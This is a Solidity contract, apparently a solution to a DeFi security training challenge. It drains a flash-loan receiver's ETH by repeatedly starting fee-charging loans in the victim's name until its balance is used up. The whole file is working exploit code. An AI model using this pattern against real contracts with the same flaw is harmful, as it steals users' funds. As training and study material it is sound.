// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    function attack(address payable pool, address victim) public {
        address eth = NaiveReceiverLenderPool(pool).ETH();
        uint256 runs = victim.balance / NaiveReceiverLenderPool(pool).flashFee(eth, 1 ether);
        for (uint256 i = 0; i < runs; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(IERC3156FlashBorrower(victim), eth, 1 ether, "0x");
        }
    }
}
